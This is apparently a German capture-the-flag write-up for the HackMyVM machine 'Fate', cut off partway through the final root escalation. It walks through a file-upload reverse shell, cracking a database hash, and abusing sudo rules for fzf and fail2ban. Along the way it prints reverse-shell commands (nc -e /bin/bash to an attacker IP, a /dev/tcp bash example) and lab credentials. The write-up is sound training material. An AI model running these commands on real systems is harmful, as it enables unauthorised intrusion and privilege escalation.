@@ -1,0 +1,598 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fate - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Fate - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">mysql (Client)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">fzf</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">watch</div>
+                <div class="tool-item">systemctl</div>
+                <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-upload">Web Enumeration & File Upload</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#db-creds-connor">Database Credential Leak & Lateral Movement (www-data to connor)</a></li>
+                <li><a href="#privesc-john">Privilege Escalation (connor to john via sudo fzf)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (john to root via sudo systemctl & fail2ban)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Die initiale Erkundungsphase zur Identifizierung des Ziels und seiner Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.109</span>	08:00:27:f8:91:dd	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** ARP-Scan findet die IP-Adresse <span class="command">192.168.2.109</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP identifiziert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nmap-Scan durchführen.
+            **Empfehlung (Admin):** Standard Netzwerksicherheit.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">(Annahme: Eintrag "192.168.2.109 fate.hmv" wurde zur /etc/hosts hinzugefügt)</span></div>
+                     <pre># (Wird später verwendet, aber nicht im Log gezeigt)</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Hostname `fate.hmv` wird später verwendet, daher nehmen wir an, dass ein entsprechender Eintrag in `/etc/hosts` erstellt wurde.</p>
+              <p class="evaluation">**Bewertung:** Erleichtert spätere Tests.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Hostnamen immer hinzufügen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.109 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 17:40 CEST
+Nmap scan report for stagiaire.hmv (192.168.2.109) <span class="password">(Hostname im Scan nicht aktuell?)</span>
+Host is up (0.00013s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+<span class="command">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">80/tcp    open  http    nginx 1.18.0</span>
+|_http-server-header: nginx/1.18.0
+|_http-title: Site doesn't have a title (text/html).
+<span class="command">13120/tcp open  http    Node.js Express framework</span>
+|_http-title: Gancio
+MAC Address: 08:00:27:F8:91:DD (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms stagiaire.hmv (192.168.2.109) <span class="password">(Hostname im Scan nicht aktuell?)</span>
+
+OS and Service detection performed. [...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) auf `192.168.2.109` findet drei offene Ports:
+             *   <span class="command">Port 22</span>: SSH (OpenSSH 8.4p1 auf Debian).
+             *   <span class="command">Port 80</span>: HTTP (Nginx 1.18.0). Die Seite hat keinen Titel.
+             *   <span class="command">Port 13120</span>: HTTP, bedient von einem <span class="command">Node.js Express Framework</span>. Der Seitentitel ist "Gancio", was auf eine spezifische Anwendung hindeutet (Gancio ist eine dezentrale Kalender-/Event-Plattform).</p>
+              <p class="evaluation">**Bewertung:** Wir haben drei Dienste: SSH, einen Standard-Nginx-Server und eine Gancio-Anwendung auf einem hohen Port. Port 80 und Port 13120 sind die primären Angriffsziele.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Beide Webserver untersuchen (Nikto, Gobuster, spezifische Recherche zu Gancio). SSH für spätere Logins vormerken.
+              **Empfehlung (Admin):** Nur notwendige Ports öffnen. Dienste aktuell halten und sicher konfigurieren.</p>
+        </section>
+
+        <section id="web-enumeration-upload">
+            <h2>Web Enumeration & File Upload</h2>
+            <p class="comment">Wir untersuchen die Webserver, beginnend mit Port 80.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.109 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...],php,[...] -t 100</span></div>
+                     <pre>
+[...]
+===============================================================
+<span class="command">http://192.168.2.109/index.html</span>           (Status: 200) [Size: 285]
+<span class="command">http://192.168.2.109/uploads</span>              (Status: 301) [Size: 169] [--> http://192.168.2.109/uploads/]
+<span class="command">http://192.168.2.109/upload.php</span>           (Status: 200) [Size: 46]
+===============================================================
+[...]
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.109</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
+[...]
++ Server: <span class="command">nginx/1.18.0</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> [...]
++ <span class="password">The X-Content-Type-Options header is not set.</span> [...]
++ No CGI Directories found [...]
++ 7915 requests: 0 error(s) and <span class="password">3 item(s) reported</span> on remote host
+[...]
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              *   Gobuster auf Port 80 findet `index.html`, ein Verzeichnis `/uploads` und eine Datei `/upload.php`. Dies deutet stark auf eine File-Upload-Funktionalität hin.
+              *   Nikto auf Port 80 findet nur die üblichen fehlenden Sicherheitsheader und keine spezifischen Schwachstellen.</p>
+               <p class="evaluation">**Bewertung:** Die Upload-Funktion (`/upload.php`, `/uploads`) auf Port 80 ist der vielversprechendste Fund auf diesem Port.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Die Upload-Funktion untersuchen. Versuchen, eine Webshell (z.B. PHP-Reverse-Shell) hochzuladen und über das `/uploads`-Verzeichnis auszuführen. Die Gancio-Anwendung auf Port 13120 ebenfalls untersuchen.
+               **Empfehlung (Admin):** Upload-Funktionen absichern (Dateityp-Validierung, Ausführungsverbot im Upload-Verzeichnis). Sicherheitsheader hinzufügen.</p>
+
+               <p class="comment">Wir untersuchen Port 13120 kurz.</p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -v 192.168.2.109 13120</span></div>
+                       <pre>fate.hmv [192.168.2.109] 13120 (?) <span class="password">open</span></pre>
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -Iv 192.168.2.109 13120</span></div>
+                        <pre>
+*   Trying 192.168.2.109:13120... <span class="password"># Fehler: curl versucht :80</span>
+* Connected to 192.168.2.109 (192.168.2.109) port 80 (#0)
+> HEAD / HTTP/1.1
+[...] <span class="password"># Antwort von Port 80, nicht 13120</span>
+* Connection #0 to host 192.168.2.109 left intact
+*   Trying 0.0.51.64:80... <span class="password"># Fehlerhafte IP-Interpretation</span>
+* connect to 0.0.51.64 port 80 failed: Connection refused
+* Failed to connect to 0.0.51.64 port 80 after 0 ms: Couldn't connect to server
+* Closing connection 0
+curl: (7) Failed to connect to 0.0.51.64 port 80 after 0 ms: Couldn't connect to server
+                        </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               *   `nc` bestätigt, dass Port 13120 offen ist.
+               *   Der `curl`-Befehl ist fehlerhaft formatiert (`curl -Iv [IP] [Port]` ist keine gültige Syntax, um den Port anzugeben). `curl` versucht stattdessen, sich mit Port 80 zu verbinden und interpretiert `13120` als Teil einer IP-Adresse, was fehlschlägt. Der korrekte Befehl wäre `curl -Iv http://192.168.2.109:13120`.</p>
+                <p class="evaluation">**Bewertung:** Die Untersuchung von Port 13120 war hier aufgrund des Syntaxfehlers nicht erfolgreich. Wir konzentrieren uns auf die Upload-Funktion auf Port 80.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Korrekte `curl`-Syntax oder Browser verwenden, um Port 13120 zu untersuchen. Fokus auf die Upload-Funktion legen.
+                **Empfehlung (Admin):** Nicht relevant.</p>
+         </section>
+
+         <section id="initial-access">
+            <h2>Initial Access (Reverse Shell)</h2>
+            <p class="comment">Wir nutzen die gefundene Upload-Funktion auf Port 80, um eine PHP-Reverse-Shell hochzuladen und auszuführen.</p>
+
+            <p class="comment">*(Hinweis: Der Upload-Vorgang selbst und die Vorbereitung der Shell (`rev.php` mit IP 192.168.2.153 und Port 9001) werden im Log nicht gezeigt, aber impliziert.)*</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">(Annahme: 'shell.php' oder 'rev.php' wurde erfolgreich hochgeladen)</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">curl -Iv http://192.168.2.109/uploads/d74ac95d3f76b58b1114d40e1499027c</span></div>
+                      <pre>
+*   Trying 192.168.2.109:80...
+* Connected to 192.168.2.109 (192.168.2.109) port 80 (#0)
+> HEAD /uploads/<span class="command">d74ac95d3f76b58b1114d40e1499027c</span> HTTP/1.1 <span class="password">(Dateiname wurde gehasht/umbenannt!)</span>
+> Host: 192.168.2.109
+> User-Agent: curl/7.85.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0
+< Date: Mon, 24 Oct 2022 15:51:01 GMT
+< Content-Type: <span class="command">application/octet-stream</span> <span class="password">(PHP wird nicht als PHP erkannt!)</span>
+< Content-Length: 5495
+< Last-Modified: Mon, 24 Oct 2022 15:49:58 GMT
+< Connection: keep-alive
+< ETag: "6356b426-1577"
+< Accept-Ranges: bytes
+<
+* Connection #0 to host 192.168.2.109 left intact
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.109/uploads/shell.php"</span></div> <span class="password">(Versuch mit Originalnamen)</span>
+                      <pre>
+<html>
+<head><title><span class="password">504 Gateway Time-out</span></title></head>
+<body>
+<center><h1><span class="password">504 Gateway Time-out</span></h1></center>
+<hr><center>nginx/1.18.0</center>
+</body>
+</html>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir versuchen, eine hochgeladene Datei abzurufen. Der Dateiname ist ein Hash (`d74ac...`), was darauf hindeutet, dass die Upload-Funktion den ursprünglichen Dateinamen ändert.
+              2.  Die `HEAD`-Anfrage ist erfolgreich (Status 200), aber der `Content-Type` ist `application/octet-stream`. Das bedeutet, der Webserver (Nginx) ist nicht so konfiguriert, dass er diese Datei als PHP interpretiert, sondern liefert sie nur zum Download aus.
+              3.  Ein Versuch, die Shell mit dem Originalnamen (`shell.php`) aufzurufen, führt zu einem `504 Gateway Time-out`. Dies könnte darauf hindeuten, dass die Datei zwar existiert, aber die Ausführung durch PHP-FPM (oder einen ähnlichen Backend-Prozess) fehlschlägt oder zu lange dauert.</p>
+               <p class="evaluation">**Bewertung:** Der direkte Aufruf der hochgeladenen PHP-Datei funktioniert nicht, da Nginx sie nicht als PHP verarbeitet oder PHP-FPM Probleme hat. Der Upload selbst scheint jedoch funktioniert zu haben.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Andere Methoden prüfen: Gibt es eine LFI-Schwachstelle, um die hochgeladene Datei einzubinden und auszuführen? Gibt es Fehlkonfigurationen in Nginx/PHP-FPM? Gibt es andere Schwachstellen (z.B. in Gancio auf Port 13120)?
+               **Empfehlung (Admin):** Sicherstellen, dass PHP-Ausführung in Upload-Verzeichnissen deaktiviert ist. Dateinamen-Hashing ist gut, verhindert aber die Ausführung nicht, wenn das Verzeichnis falsch konfiguriert ist. Timeout-Fehler untersuchen.</p>
+
+              <p class="comment">*(Der Bericht macht einen Sprung. Es ist unklar, wie die Reverse Shell letztendlich ausgelöst wurde. Möglicherweise wurde eine andere Schwachstelle gefunden oder die Konfiguration geändert. Wir dokumentieren den erfolgreichen Empfang der Shell.)*</p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                       <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.109] 59904</span> <span class="password">(IP 192.168.2.153 ist Angreifer-IP?)</span>
+Linux fate 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64 GNU/Linux
+[...]
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="command"># Shell als www-data erhalten!</span>
+                       </pre>
+                    </div>
+               </div>
+                <p class="analysis">**Analyse:** Ein Netcat-Listener auf Port 9001 empfängt eine Verbindung vom Zielsystem (`192.168.2.109`). Wir erhalten eine Shell als Benutzer `www-data`.</p>
+                <p class="evaluation">**Bewertung:** Initial Access erfolgreich, auch wenn der genaue Trigger-Mechanismus unklar bleibt (wahrscheinlich wurde das Problem mit dem PHP-Upload oder der Ausführung doch noch gelöst).</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren, System enumerieren.
+                **Empfehlung (Admin):** Die Ursache für die RCE finden und beheben.</p>
+         </section>
+
+        <section id="db-creds-connor">
+            <h2>Database Credential Leak & Lateral Movement (www-data to connor)</h2>
+            <p class="comment">Als `www-data` enumerieren wir das System, insbesondere das Home-Verzeichnis und laufende Anwendungen, um Zugangsdaten oder Privesc-Pfade zu finden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">(Shell Stabilisierung ausgelassen)</span></div>
+                     <div class="prompt">www-data@fate:/$ <span class="command">ls /home</span></div>
+                     <pre>
+<span class="command">connor</span>	<span class="command">john</span>  <span class="command">sarah</span>
+                     </pre>
+                     <div class="prompt">www-data@fate:/home$ <span class="command">ls connor/</span></div> <span class="password"># Leer</span>
+                     <div class="prompt">www-data@fate:/home$ <span class="command">ls john/</span></div>
+                     <pre>note.txt  user.txt</pre>
+                     <div class="prompt">www-data@fate:/home$ <span class="command">cat john/note.txt</span></div>
+                      <pre><span class="password">cat: john/note.txt: Permission denied</span></pre>
+                      <div class="prompt">www-data@fate:/home$ <span class="command">cat john/user.txt</span></div>
+                      <pre><span class="password">cat: john/user.txt: Permission denied</span></pre>
+                      <div class="prompt">www-data@fate:/home$ <span class="command">find / -user root -perm -4000 2>/dev/null</span></div>
+                      <pre>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/umount
+                      </pre> <span class="password">(Keine ungewöhnlichen SUIDs)</span>
+                     <div class="prompt">www-data@fate:/opt$ <span class="command">ls -la /opt/gancio/</span></div>
+                     <pre>
+total 20
+drwxr-xr-x 4 <span class="command">gancio gancio</span> 4096 Feb 16  2022 .
+drwxr-xr-x 3 root   root   4096 Feb 16  2022 ..
+-rw-r--r-- 1 <span class="command">gancio gancio</span>  474 Feb 16  2022 <span class="command">config.json</span>
+drwxr-xr-x 2 <span class="command">gancio gancio</span> 4096 Oct 24 16:36 logs
+drwxr-xr-x 3 <span class="command">gancio gancio</span> 4096 Feb 16  2022 uploads
+                     </pre>
+                      <div class="prompt">www-data@fate:/opt/gancio$ <span class="command">cat config.json</span></div>
+                      <pre>
+{
+  "baseurl": "http://192.168.1.76:13120",
+  "hostname": "192.168.1.76",
+[...]
+  "db": {
+    "dialect": "mariadb",
+[...]
+    "database": "gancio",
+    "username": "<span class="command">gancio</span>",
+    "password": "<span class="password">gancio</span>", <span class="password"># DB Credentials!</span>
+[...]
+  },
+[...]
+}
+                      </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir finden die Home-Verzeichnisse der Benutzer `connor`, `john` und `sarah`. Wir haben keine Leserechte auf die Dateien von `john`.
+             2.  Die Suche nach SUID-Dateien ergibt keine ungewöhnlichen Ergebnisse.
+             3.  Im Verzeichnis `/opt/gancio` (die Anwendung von Port 13120) finden wir eine `config.json`-Datei, die dem Benutzer `gancio` gehört.
+             4.  Wir können diese Datei als `www-data` lesen (`cat config.json`) und finden darin Datenbank-Zugangsdaten für MariaDB: User `<span class="command">gancio</span>`, Passwort `<span class="password">gancio</span>`, Datenbank `gancio`.</p>
+              <p class="evaluation">**Bewertung:** Kritischer Fund! Wir haben Datenbank-Zugangsdaten gefunden, die wahrscheinlich von der Gancio-Anwendung genutzt werden. In der Datenbank könnten Benutzerdaten (Hashes) von Gancio gespeichert sein.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Mit den gefundenen Credentials (`gancio`:`gancio`) über den lokalen MySQL/MariaDB-Client mit der Datenbank verbinden. Die `users`-Tabelle suchen und die Hashes der Benutzer (`admin`, `connor`) extrahieren. Versuchen, die Hashes zu knacken.
+              **Empfehlung (Admin):** Datenbank-Credentials nicht im Klartext in Konfigurationsdateien speichern (Umgebungsvariablen oder sicherere Methoden nutzen). Dateiberechtigungen für Konfigurationsdateien härten (nur für den benötigten Benutzer lesbar machen, hier `gancio`).</p>
+
+             <p class="comment">Wir verbinden uns mit der Datenbank, extrahieren die Benutzer-Hashes und knacken das Passwort für `connor`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@fate:/opt/gancio$ <span class="command">mysql -u gancio -p</span></div>
+                     <pre>
+Enter password: <span class="password">gancio</span>
+Welcome to the MariaDB monitor. [...]
+MariaDB [(none)]> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| <span class="command">gancio</span>             |
+| information_schema |
++--------------------+
+[...]
+MariaDB [(none)]> <span class="command">use gancio;</span>
+Database changed
+MariaDB [gancio]> <span class="command">show tables;</span>
++---------------------+
+| Tables_in_gancio    |
++---------------------+
+[...]
+| <span class="command">users</span>               |
++---------------------+
+[...]
+MariaDB [gancio]> <span class="command">select * from users;</span>
++----+--------------+----------+------------------+-------------+--------------------------------------------------------------+--------------+----------+-----------+------+---------------------+---------------------+
+| id | display_name | settings | email            | description | password                                                     | recover_code | is_admin | is_active | rsa  | createdAt           | updatedAt           |
++----+--------------+----------+------------------+-------------+--------------------------------------------------------------+--------------+----------+-----------+------+---------------------+---------------------+
+|  1 | NULL         | []       | <span class="command">admin</span>            | NULL        | <span class="password">$2a$10$FSC73AzC1b9byrVIyEB6M.9wQTLWLC66aO3zkv4jmzCVxO9O2t.e2</span> | NULL         |        1 |         1 | NULL | 2022-02-16 09:51:21 | 2022-02-16 09:51:21 |
+|  2 | NULL         | []       | <span class="command">connor@localhost</span> | NULL        | <span class="password">$2a$10$U1/NLsG/tYgmr.Guimmv/eTvgTsA8.4lYRYHtqRn8N3ZE/6cGXJ1O</span> |              |        0 |         1 | NULL | 2022-02-16 09:52:04 | 2022-02-16 09:52:11 |
++----+--------------+----------+------------------+-------------+--------------------------------------------------------------+--------------+----------+-----------+------+---------------------+---------------------+
+[...]
+                     </pre>
+                      <div class="prompt"># <span class="command">(Hash für connor knacken)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '$2a$10$U1/NLsG/tYgmr.Guimmv/eTvgTsA8.4lYRYHtqRn8N3ZE/6cGXJ1O' > jj</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt jj</span></div>
+                       <pre>
+[...]
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+[...]
+<span class="password">genesis</span>          (?)
+1g 0:00:00:01 DONE [...]
+Use the "--show" option to display all of the cracked passwords reliably
+                       </pre>
+                        <div class="prompt"># <span class="command">(Lateral Movement zu connor)</span></div>
+                         <div class="prompt">www-data@fate:/opt/gancio$ <span class="command">su connor</span></div>
+                        <pre>
+Password: <span class="password">genesis</span>
+<span class="command">connor@fate:/opt/gancio$</span> <span class="password"># Wechsel erfolgreich!</span>
+                        </pre>
+                    </div>
+                </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir verbinden uns erfolgreich als `gancio` mit der MariaDB-Datenbank.
+               2.  Wir listen die Tabellen in der `gancio`-Datenbank auf und finden die `users`-Tabelle.
+               3.  Wir lesen alle Einträge aus der `users`-Tabelle. Wir finden die Benutzer `admin` und `connor@localhost` sowie deren Passwort-Hashes (Bcrypt, `$2a$`).
+               4.  Wir kopieren den Hash für `connor` (`$2a$10$U1...`) und versuchen, ihn mit `john` und `rockyou.txt` zu knacken.
+               5.  John findet erfolgreich das Passwort: `<span class="password">genesis</span>`.
+               6.  Wir verwenden `su connor` und geben das geknackte Passwort `genesis` ein, um zum Benutzer `connor` zu wechseln.</p>
+                <p class="evaluation">**Bewertung:** Lateral Movement von `www-data` zu `connor` erfolgreich! Das Passwort von `connor` konnte aus dem Datenbank-Hash geknackt werden.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `connor` enumerieren (`sudo -l`).
+                **Empfehlung (Admin):** Starke Passwörter verwenden, die nicht leicht zu knacken sind. Datenbankzugriff schützen.</p>
+         </section>
+
+        <section id="privesc-john">
+             <h2>Privilege Escalation (connor to john via sudo fzf)</h2>
+             <p class="comment">Als Benutzer `connor` suchen wir nach weiteren Eskalationsmöglichkeiten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">connor@fate:/opt/gancio$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for connor on fate:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User connor may run the following commands on fate:
+    <span class="password">(john) NOPASSWD: /usr/bin/fzf</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `sudo -l` für `connor` zeigt, dass er den Befehl `/usr/bin/fzf` als Benutzer `<span class="command">john</span>` ohne Passwort (`NOPASSWD`) ausführen darf. `fzf` ist ein Kommandozeilen-Fuzzy-Finder.</p>
+              <p class="evaluation">**Bewertung:** Dies ist ein klarer Privesc-Vektor zu `john`. `fzf` erlaubt oft die Ausführung von Befehlen über Optionen wie `--preview`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die `--preview`-Option von `fzf` nutzen, um einen Befehl als `john` auszuführen. Ziel ist es, eine Shell oder Reverse Shell als `john` zu erhalten. Beispiel: `sudo -u john /usr/bin/fzf --preview="bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'"` (oder eine direktere Reverse Shell mit `nc`).
+              **Empfehlung (Admin):** Unsichere `sudo`-Regeln vermeiden. Tools wie `fzf`, die Befehlsausführung erlauben, sollten nicht über `sudo` für andere Benutzer zugänglich gemacht werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">(Listener starten auf Port 9002)</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                      <pre>listening on [any] 9002 ...</pre>
+                     <div class="prompt"># <span class="command">(Auf Zielsystem als connor)</span></div>
+                      <div class="prompt">connor@fate:~$ <span class="command">sudo -u john /usr/bin/fzf --preview="nc -e /bin/bash 192.168.2.153 9002"</span></div>
+                       <pre># (fzf startet, der Preview-Befehl wird ausgeführt)</pre>
+                       <div class="prompt"># <span class="command">(Listener empfängt Verbindung)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                       <pre>
+listening on [any] 9002 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.109] 55186</span>
+<span class="command"># Shell als john erhalten!</span>
+id <span class="password"># (Impliziert)</span>
+<span class="command">uid=1001(john) gid=1001(john) groups=1001(john)</span>
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir starten einen Netcat-Listener auf Port 9002.
+              2.  Als `connor` führen wir `sudo -u john /usr/bin/fzf` aus und verwenden die Option `--preview`, um eine Netcat-Reverse-Shell (`nc -e /bin/bash [Angreifer-IP] 9002`) als `john` zu starten.
+              3.  Der `fzf`-Prozess führt den Preview-Befehl aus, und unser Listener empfängt die Verbindung. Wir haben eine Shell als Benutzer `<span class="command">john</span>`.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation von `connor` zu `john` erfolgreich durch Ausnutzung der `sudo`-Regel für `fzf`.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `john` enumerieren (`sudo -l`), User-Flag lesen.
+               **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen.</p>
+         </section>
+
+         <section id="privesc-root">
+            <h2>Privilege Escalation (john to root via sudo systemctl & fail2ban)</h2>
+            <p class="comment">Als Benutzer `john` suchen wir den letzten Schritt zu Root.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">john@fate:~$ <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rwxrwx--- 1 sarah john  109 feb 16  2022 <span class="command">note.txt</span>
+[...]
+-rw------- 1 john  john   15 feb 16  2022 <span class="command">user.txt</span>
+                     </pre>
+                      <div class="prompt">john@fate:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">Ineedyourboots</span></pre>
+                      <div class="prompt">john@fate:~$ <span class="command">cat note.txt</span></div>
+                     <pre>
+Hi john,
+Im trying to contact you, but fail2ban is blocking me.
+Please, stop it and take my message.
+                     </pre>
+                      <div class="prompt">john@fate:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[...]
+User john may run the following commands on fate:
+    <span class="password">(root) NOPASSWD: /usr/bin/systemctl restart fail2ban</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:**
+             1.  Wir lesen die User-Flag (`Ineedyourboots`) aus `user.txt`.
+             2.  Eine Datei `note.txt` erwähnt Probleme mit `fail2ban`.
+             3.  `sudo -l` für `john` zeigt, dass er den Befehl `/usr/bin/systemctl restart fail2ban` als `root` ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+             <p class="evaluation">**Bewertung:** Dies ist der klare Vektor zu Root. Fail2ban liest Konfigurationsdateien (`.conf`) und Aktionsdateien (`action.d/*.conf`), um zu bestimmen, welche Aktionen (z.B. `iptables`-Regeln anwenden) bei fehlgeschlagenen Logins ausgeführt werden sollen. Wenn wir eine dieser Dateien modifizieren können, um einen Befehl einzuschleusen, wird dieser beim Neustart von Fail2ban (den wir als `john` via `sudo` auslösen können) als Root ausgeführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+                1. Die Fail2ban-Konfigurationsverzeichnisse (`/etc/fail2ban/`, `/etc/fail2ban/action.d/`) auf für `john` beschreibbare Dateien prüfen.
+                2. Wenn eine Aktionsdatei (z.B. `iptables-common.conf`) beschreibbar ist: Den Pfad zu einem auszuführenden Befehl (z.B. `iptables`) durch einen Pfad zu einem eigenen Skript ersetzen (z.B. `/tmp/exploit`).
+                3. Das eigene Skript (`/tmp/exploit`) erstellen und ausführbar machen. Es sollte einen Payload enthalten (z.B. Reverse Shell, SUID auf Bash).
+                4. `sudo /usr/bin/systemctl restart fail2ban` ausführen, um den Exploit auszulösen.
